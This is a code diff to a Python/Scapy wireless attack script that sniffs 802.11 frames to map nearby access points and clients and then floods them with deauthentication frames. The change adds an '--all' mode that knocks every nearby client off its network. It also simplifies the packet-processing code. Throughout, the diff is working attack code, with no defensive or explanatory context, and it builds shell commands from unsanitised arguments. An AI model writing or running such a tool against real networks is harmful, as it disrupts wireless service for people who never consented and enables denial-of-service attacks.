@@ -19,13 +19,9 @@ status_color = {
 
 deauth_frame_set_count = 10
 send_interval_delay = 0.1
-sent_frames, received_frames = {}, {}
-beacon_frames = {}
+all_access_points = set()
 access_points = {}
-probes = {}
 associations = {}
-total_devices = set()
-hidden_networks = {}
 packet_sent_loops = 10
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
 started_sniffing = False
@@ -48,74 +44,11 @@ def check_root():
 def process_packet(packet):
     if packet.haslayer(Dot11Beacon):
         bssid = packet[Dot11].addr2.upper()
-        try:
-            recv_addr = packet[Dot11].addr1.upper()
-        except:
-            recv_addr = "FF:FF:FF:FF:FF:FF"
-        essid = packet[Dot11Elt].info.decode()
-        rate = packet[RadioTap].Rate
-        channel_frequency = packet[RadioTap].ChannelFrequency
-        signal_strength = packet[RadioTap].dBm_AntSignal
         network_stats = packet[Dot11Beacon].network_stats()
         channel = network_stats["channel"]
-        crypto = list(network_stats["crypto"])[0]
         with lock:
-            if bssid not in sent_frames.keys():
-                sent_frames[bssid] = 0
-            if bssid not in received_frames.keys():
-                received_frames[bssid] = 0
-            sent_frames[bssid] += 1
-            if recv_addr not in received_frames.keys():
-                received_frames[recv_addr] = 0
-            if recv_addr not in sent_frames.keys():
-                sent_frames[recv_addr] = 0
-            received_frames[recv_addr] += 1
-            access_points[bssid] = {
-                "essid" : essid,
-                "rate" : rate,
-                "channel_frequency" : channel_frequency,
-                "signal_strength" : signal_strength,
-                "channel" : channel,
-                "crypto" : crypto,
-            }
-            if bssid not in beacon_frames.keys():
-                beacon_frames[bssid] = 0
-            beacon_frames[bssid] += 1
-            associations[bssid] = recv_addr
-            associations[recv_addr] = bssid
-            total_devices.add(bssid)
-            total_devices.add(recv_addr)
-    elif packet.haslayer(Dot11ProbeReq):
-        bssid = packet[Dot11].addr2.upper()
-        try:
-            recv_addr = packet[Dot11].addr1.upper()
-        except:
-            recv_addr = "FF:FF:FF:FF:FF:FF"
-        probe_essid = packet[Dot11Elt].info.decode()
-        rate = packet[RadioTap].Rate
-        channel_frequency = packet[RadioTap].ChannelFrequency
-        signal_strength = packet[RadioTap].dBm_AntSignal
-        with lock:
-            if bssid not in sent_frames.keys():
-                sent_frames[bssid] = 0
-            if bssid not in received_frames.keys():
-                received_frames[bssid] = 0
-            sent_frames[bssid] += 1
-            if recv_addr not in received_frames.keys():
-                received_frames[recv_addr] = 0
-            if recv_addr not in sent_frames.keys():
-                sent_frames[recv_addr] = 0
-            received_frames[recv_addr] += 1
-            if bssid not in probes.keys():
-                probes[bssid] = {"probes": set()}
-            probes[bssid]["rate"] = rate
-            probes[bssid]["channel_frequency"] = channel_frequency
-            probes[bssid]["signal_strength"] = signal_strength
-            probes[bssid]["probes"].add(probe_essid)
-            associations[bssid] = recv_addr
-            associations[recv_addr] = bssid
-            total_devices.add(bssid)
-            total_devices.add(recv_addr)
+            access_points[bssid] = {"channel" : channel}
+            all_access_points.add(bssid)
     elif packet.haslayer(Dot11ProbeResp):
         try:
             bssid = packet[Dot11].addr2.upper()
@@ -125,32 +58,12 @@ def process_packet(packet):
             recv_addr = packet[Dot11].addr1.upper()
         except:
             recv_addr = "FF:FF:FF:FF:FF:FF"
-        probe_essid = packet[Dot11Elt].info.decode()
-        rate = packet[RadioTap].Rate
-        channel_frequency = packet[RadioTap].ChannelFrequency
-        signal_strength = packet[RadioTap].dBm_AntSignal
         with lock:
-            if bssid not in beacon_frames.keys() or access_points.items():
-                hidden_networks[bssid] = {
-                    "essid" : probe_essid,
-                    "rate" : rate,
-                    "channel_frequency": channel_frequency,
-                    "signal_strength" : signal_strength
-                }
-            if bssid not in sent_frames.keys():
-                sent_frames[bssid] = 0
-            if bssid not in received_frames.keys():
-                received_frames[bssid] = 0
-            sent_frames[bssid] += 1
-            if recv_addr not in received_frames.keys():
-                received_frames[recv_addr] = 0
-            if recv_addr not in sent_frames.keys():
-                sent_frames[recv_addr] = 0
-            received_frames[recv_addr] += 1
-            associations[bssid] = recv_addr
-            associations[recv_addr] = bssid
-            total_devices.add(bssid)
-            total_devices.add(recv_addr)
+            if bssid.lower() != broadcast_mac:
+                all_access_points.add(bssid)
+            if recv_addr.lower() != broadcast_mac and bssid.lower() != broadcast_mac:
+                associations[bssid] = recv_addr
+                associations[recv_addr] = bssid
     elif packet.haslayer(Dot11):
         try:
             bssid = packet[Dot11].addr2.upper()
@@ -161,20 +74,11 @@ def process_packet(packet):
         except:
             recv_addr = "FF:FF:FF:FF:FF:FF"
         with lock:
-            if bssid not in sent_frames.keys():
-                sent_frames[bssid] = 0
-            if bssid not in received_frames.keys():
-                received_frames[bssid] = 0
-            sent_frames[bssid] += 1
-            if recv_addr not in received_frames.keys():
-                received_frames[recv_addr] = 0
-            if recv_addr not in sent_frames.keys():
-                sent_frames[recv_addr] = 0
-            received_frames[recv_addr] += 1
-            associations[bssid] = recv_addr
-            associations[recv_addr] = bssid
-            total_devices.add(bssid)
-            total_devices.add(recv_addr)
+            if bssid.lower() != broadcast_mac:
+                all_access_points.add(bssid)
+            if recv_addr.lower() != broadcast_mac and bssid.lower() != broadcast_mac:
+                associations[bssid] = recv_addr
+                associations[recv_addr] = bssid
 def changeChannel(interface, channel):
     system(f"iwconfig {interface} channel {channel}")
 def sendDeauthenticationFrame(ssid, client, iface, count, interval):
@@ -190,6 +94,7 @@ def sendDeauthenticationFrameHandler(divisions, interface, count, delay):
 
 if __name__ == "__main__":
     arguments = get_arguments(('-i', "--interface", "interface", "Network Interface to Start Sniffing on"),
+                              ('-A', "--all", "all", "Deauth All Clients nearby (Broadcast/Individual, Default=Individual)"),
                               ('-s', "--ssid", "ssid", "SSID for Access Point"),
                               ('-c', "--client", "client", "SSIDs for Clients (Seperated by ',')"),
                               ('-L', "--load", "load", "Load SSIDs for Access Points and their Clients from File (AP SSID,Client SSID,Channel)"),
@@ -234,7 +139,7 @@ if __name__ == "__main__":
         except Exception as error:
             display('-', f"Error Occured => {Back.YELLOW}{error}{Back.RESET}")
             exit(0)
-    else:
+    elif not arguments.all:
         if not arguments.ssid:
             display('-', "Please Enter a SSID for the Target Access Point!")
             exit(0)
@@ -244,9 +149,9 @@ if __name__ == "__main__":
             arguments.client = [broadcast_mac]
         else:
             arguments.client = arguments.client.split(',')
-        Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
-        started_sniffing = True
         if not arguments.channel:
+            Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
+            started_sniffing = True
             display('*', "Channel not Provided!")
             display(':', f"Waiting for Beacon Frame for SSID => {Back.MAGENTA}{arguments.ssid}{Back.RESET}")
             while True:
@@ -255,17 +160,21 @@ if __name__ == "__main__":
                         arguments.channel = access_points[arguments.ssid]["channel"]
                         break
         deauth_details[arguments.channel] = {arguments.ssid: [client for client in arguments.client]}
-    channel_wise_divisions = {}
-    print(f"{Fore.CYAN}AP BSSID         \tCLIENT BSSID         \tCHANNEL{Fore.RESET}")
-    for channel, details in deauth_details.items():
-        total_essid_pairs = []
-        for ap_bssid, clients in details.items():
-            print('\n'.join([f"{Fore.GREEN}{ap_bssid}\t{client}\t{channel}{Fore.RESET}" for client in clients]))
-            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
-        total_pairs = len(total_essid_pairs)
-        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
-        channel_wise_divisions[channel] = current_division
-    loop_count = 0
+    else:
+        Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
+        started_sniffing = True
+    if not arguments.all:
+        channel_wise_divisions = {}
+        print(f"{Fore.CYAN}AP BSSID         \tCLIENT BSSID         \tCHANNEL{Fore.RESET}")
+        for channel, details in deauth_details.items():
+            total_essid_pairs = []
+            for ap_bssid, clients in details.items():
+                print('\n'.join([f"{Fore.GREEN}{ap_bssid}\t{client}\t{channel}{Fore.RESET}" for client in clients]))
+                total_essid_pairs.extend([[ap_bssid, client] for client in clients])
+            total_pairs = len(total_essid_pairs)
+            current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
+            channel_wise_divisions[channel] = current_division
+        loop_count = 0
     while True:
         for channel, channel_wise_division in channel_wise_divisions.items():
             display('+', f"Changing Channel of {Back.MAGENTA}{arguments.interface}{Back.RESET} to {Back.MAGENTA}{arguments.channel}{Back.RESET}")
